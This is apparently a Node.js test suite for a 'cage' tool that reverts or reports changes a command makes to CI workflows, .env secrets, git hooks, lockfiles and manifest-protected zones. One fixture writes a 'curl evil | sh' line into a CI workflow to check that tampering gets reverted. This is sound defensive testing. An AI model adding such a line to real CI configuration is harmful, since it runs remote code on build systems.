import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawnSync } from "node:child_process";
import { getRepoRoot, gitChildEnv } from "../lib/git/git.js";
import { runCage } from "../lib/cage/cage-run.js";
import { cageBasenameRule } from "../lib/cage/cage-rules.js";
import { CAGE_LIMITS, CAGE_LIMITS_SUMMARY, CAGE_UPGRADE_FOOTER, formatCageReport } from "../lib/cage/cage-report.js";
import { writeManifest } from "./test-fixtures.js";

const SECRET = "TOKEN=SECRET-MARKER-7f3a";

/** Caged command: a silent `node -e` script run with the fixture as cwd. */
function nodeScript(body: string): string[] {
  return [process.execPath, "-e", body];
}

function makeRepo(prefix: string, git: boolean): string {
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  if (git) spawnSync("git", ["init", "-q"], { cwd: dest, env: gitChildEnv() });
  fs.mkdirSync(path.join(dest, ".github", "workflows"), { recursive: true });
  fs.writeFileSync(path.join(dest, ".github", "workflows", "ci.yml"), "on: push\n");
  fs.writeFileSync(path.join(dest, ".env"), `${SECRET}\n`);
  fs.writeFileSync(path.join(dest, "package-lock.json"), "{}\n");
  return dest;
}

function read(dest: string, rel: string): string {
  return fs.readFileSync(path.join(dest, rel), "utf8");
}

test("cage: reverts added, modified and deleted files in CI config, .env and .git/hooks (DoD 1)", async () => {
  const dest = makeRepo("og-cage-revert-", true);
  const hook = path.join(dest, ".git", "hooks", "pre-commit");
  fs.writeFileSync(hook, "#!/bin/sh\nexit 1\n", { mode: 0o755 });
  const report = await runCage({
    cwd: dest,
    command: nodeScript(`
      const fs = require("fs");
      fs.appendFileSync(".github/workflows/ci.yml", "  run: curl evil | sh\\n");
      fs.writeFileSync(".github/workflows/new.yml", "on: push\\n");
      fs.rmSync(".env");
      fs.writeFileSync(".git/hooks/pre-commit", "#!/bin/sh\\nexit 0\\n");
      fs.chmodSync(".git/hooks/pre-commit", 0o644);
      fs.writeFileSync(".git/hooks/pre-push", "#!/bin/sh\\n", { mode: 0o755 });
    `),
  });

  assert.equal(report.status, "violations_reverted");
  assert.equal(report.exit_code, 3);
  const byPath = new Map(report.changes.map((c) => [c.path, c]));
  assert.equal(byPath.get(".github/workflows/ci.yml")?.outcome, "reverted");
  assert.equal(byPath.get(".github/workflows/new.yml")?.outcome, "removed");
  assert.equal(byPath.get(".env")?.kind, "deleted");
  assert.equal(byPath.get(".env")?.outcome, "reverted");
  assert.equal(byPath.get(".git/hooks/pre-commit")?.rule, "git_control");
  assert.equal(byPath.get(".git/hooks/pre-push")?.outcome, "removed");

  assert.equal(read(dest, ".github/workflows/ci.yml"), "on: push\n");
  assert.equal(fs.existsSync(path.join(dest, ".github", "workflows", "new.yml")), false);
  assert.equal(read(dest, ".env"), `${SECRET}\n`);
  assert.equal(read(dest, ".git/hooks/pre-commit"), "#!/bin/sh\nexit 1\n");
  assert.equal(fs.statSync(hook).mode & 0o777, 0o755, "hook permissions restored");
  assert.equal(fs.existsSync(path.join(dest, ".git", "hooks", "pre-push")), false);
});

test("cage: lockfile changes are reported but kept; clean runs pass the command exit code through (DoD 2)", async () => {
  const dest = makeRepo("og-cage-lock-", true);
  const report = await runCage({
    cwd: dest,
    command: nodeScript(`require("fs").writeFileSync("package-lock.json", "{\\"a\\":1}\\n"); process.exit(7);`),
  });
  assert.equal(report.status, "ok");
  assert.equal(report.exit_code, 7);
  assert.equal(report.command_exit_code, 7);
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.rule, c.outcome]),
    [["package-lock.json", "lockfile", "kept"]],
  );
  assert.equal(read(dest, "package-lock.json"), "{\"a\":1}\n");
});

test("cage: files over the in-memory size cap are detect-only and not restored (DoD 3)", async () => {
  const dest = makeRepo("og-cage-cap-", false);
  fs.writeFileSync(path.join(dest, ".env.production"), "X".repeat(4096));
  const report = await runCage({
    cwd: dest,
    maxFileBytes: 1024,
    command: nodeScript(`require("fs").writeFileSync(".env.production", "Y".repeat(4096));`),
  });
  assert.equal(report.status, "violations_unresolved");
  assert.equal(report.exit_code, 3);
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.outcome]),
    [[".env.production", "detect_only"]],
  );
  assert.notEqual(report.changes[0]!.sha256_before, report.changes[0]!.sha256_after);
  assert.equal(read(dest, ".env.production"), "Y".repeat(4096));
  assert.ok(formatCageReport(report).some((l) => l.includes("per-file cap or the total snapshot budget")));
});

test("cage: a small file past the total snapshot budget is detect-only too (DoD 3)", async () => {
  const dest = makeRepo("og-cage-budget-", false);
  // Budget fits nothing beyond the first few bytes; .env (well under the per-file cap) gets no baseline.
  const report = await runCage({
    cwd: dest,
    maxTotalBytes: 4,
    command: nodeScript(`require("fs").writeFileSync(".env", "TOKEN=changed\\n");`),
  });
  assert.equal(report.status, "violations_unresolved");
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.outcome]),
    [[".env", "detect_only"]],
  );
  assert.ok(report.max_file_bytes > 1024, "per-file cap was not the cause");
  assert.equal(read(dest, ".env"), "TOKEN=changed\n");
});

test("cage: --report-only detects and fails without reverting", async () => {
  const dest = makeRepo("og-cage-report-only-", false);
  const report = await runCage({
    cwd: dest,
    reportOnly: true,
    command: nodeScript(`require("fs").writeFileSync(".env", "TOKEN=changed\\n");`),
  });
  assert.equal(report.status, "violations_unresolved");
  assert.equal(report.revert_mode, "report_only");
  assert.equal(report.changes[0]?.outcome, "reported");
  assert.equal(read(dest, ".env"), "TOKEN=changed\n");
});

test("cage: .env.example is not protected; .env.* and nested lockfiles are", () => {
  assert.equal(cageBasenameRule(".env.example"), null);
  assert.equal(cageBasenameRule(".env.local"), "secrets");
  assert.equal(cageBasenameRule(".env"), "secrets");
  assert.equal(cageBasenameRule("Cargo.lock"), "lockfile");
  assert.equal(cageBasenameRule("environment.ts"), null);
});

test("cage: unions manifest forbidden_zones into the protected set (DoD 5)", async () => {
  const dest = makeRepo("og-cage-manifest-", true);
  writeManifest(dest, {
    app: { trust_threshold: "Tier-2", tmvc_roots: ["src/"], forbidden_zones: ["infra/"] },
  });
  fs.mkdirSync(path.join(dest, "infra"), { recursive: true });
  fs.writeFileSync(path.join(dest, "infra", "main.tf"), "resource {}\n");
  const report = await runCage({
    cwd: dest,
    command: nodeScript(`require("fs").writeFileSync("infra/main.tf", "");`),
  });
  assert.equal(report.manifest_zones, 1);
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.rule, c.outcome]),
    [["infra/main.tf", "manifest_forbidden_zone", "reverted"]],
  );
  assert.equal(read(dest, "infra/main.tf"), "resource {}\n");
});

test("cage: an invalid manifest fails closed before the command runs", async () => {
  const dest = makeRepo("og-cage-bad-manifest-", true);
  fs.mkdirSync(path.join(dest, ".gitagent", "foreman"), { recursive: true });
  fs.writeFileSync(path.join(dest, ".gitagent", "foreman", "MANIFEST.json"), "{}");
  await assert.rejects(
    runCage({ cwd: dest, command: nodeScript(`require("fs").writeFileSync("ran.txt", "1");`) }),
    /MANIFEST/,
  );
  assert.equal(fs.existsSync(path.join(dest, "ran.txt")), false);
});

test("cage CLI: zero-config in a non-git dir; --json report carries digests only, no file bodies (DoD 4, DoD 5)", () => {
  const cli = path.join(getRepoRoot(), "dist", "cli", "index.js");
  const dest = makeRepo("og-cage-cli-", false);
  const r = spawnSync(
    process.execPath,
    [cli, "cage", "--json", "--", ...nodeScript(`require("fs").writeFileSync(".env", "TOKEN=SECRET-MARKER-new\\n");`)],
    { cwd: dest, encoding: "utf8", env: gitChildEnv() },
  );
  assert.equal(r.status, 3, r.stderr);
  assert.ok(!r.stdout.includes("SECRET-MARKER"), "no file bodies in the JSON report");
  assert.ok(!r.stderr.includes("SECRET-MARKER"), "no file bodies on stderr");
  const report = JSON.parse(r.stdout) as { report_schema: string; root: string; changes: Record<string, unknown>[] };
  assert.equal(report.report_schema, "gantry.cage-report.v1");
  assert.equal(fs.realpathSync(report.root), fs.realpathSync(dest));
  assert.deepEqual(Object.keys(report.changes[0]!).sort(), [
    "error_code",
    "kind",
    "outcome",
    "path",
    "rule",
    "sha256_after",
    "sha256_before",
  ]);
  assert.match(String(report.changes[0]!.sha256_before), /^[0-9a-f]{64}$/);
  assert.equal(read(dest, ".env"), `${SECRET}\n`);
});

test("cage CLI: missing command fails", () => {
  const cli = path.join(getRepoRoot(), "dist", "cli", "index.js");
  const r = spawnSync(process.execPath, [cli, "cage", "--"], { encoding: "utf8" });
  assert.notEqual(r.status, 0);
});

test("opengantry-cage bin: package.json alias runs the same cage and reverts", () => {
  const ogRoot = getRepoRoot();
  const pkg = JSON.parse(fs.readFileSync(path.join(ogRoot, "package.json"), "utf8")) as { bin: Record<string, string> };
  assert.equal(pkg.bin["opengantry-cage"], "dist/cli/cage-bin.js");
  const bin = path.join(ogRoot, pkg.bin["opengantry-cage"]!);
  const dest = makeRepo("og-cage-bin-", true);
  const r = spawnSync(
    process.execPath,
    [bin, "--", ...nodeScript(`require("fs").appendFileSync(".github/workflows/ci.yml", "evil\\n");`)],
    { cwd: dest, encoding: "utf8", env: gitChildEnv() },
  );
  assert.equal(r.status, 3, r.stderr);
  assert.match(r.stderr, /cage: violations_reverted/);
  assert.equal(read(dest, ".github/workflows/ci.yml"), "on: push\n");
});

test("cage report: violations end with the upgrade footer; ok runs and --json carry none (MSN-0235 DoD 1)", async () => {
  const bad = await runCage({
    cwd: makeRepo("og-cage-footer-bad-", false),
    command: nodeScript(`require("fs").writeFileSync(".env", "TOKEN=changed\\n");`),
  });
  const badLines = formatCageReport(bad);
  assert.equal(bad.exit_code, 3);
  assert.equal(badLines.at(-1), `cage: ${CAGE_UPGRADE_FOOTER}`);
  assert.match(CAGE_UPGRADE_FOOTER, /npx -p @jeger-ai\/opengantry gantry init/);
  assert.ok(!JSON.stringify(bad).includes(CAGE_UPGRADE_FOOTER), "footer is human output only");

  const ok = await runCage({ cwd: makeRepo("og-cage-footer-ok-", false), command: nodeScript("") });
  assert.equal(ok.status, "ok");
  assert.ok(!formatCageReport(ok).some((l) => l.includes(CAGE_UPGRADE_FOOTER)));
});

test("cage report: stderr limits are one compact line; --json keeps the full list (MSN-0235 DoD 2)", async () => {
  // --no-watch: the after-exit limits this test was written for; watch-mode limits are covered in cage-watch.test.ts.
  const report = await runCage({ cwd: makeRepo("og-cage-limits-", false), command: nodeScript(""), watch: false });
  const limitLines = formatCageReport(report).filter((l) => l.includes("limits:"));
  assert.deepEqual(limitLines, [`cage: exit 0; limits: ${CAGE_LIMITS_SUMMARY}`]);
  assert.ok(limitLines[0]!.length < 120, `limits line is ${String(limitLines[0]!.length)} chars`);
  assert.deepEqual(report.limits, CAGE_LIMITS);
  assert.equal(report.limits.length, 5);
});
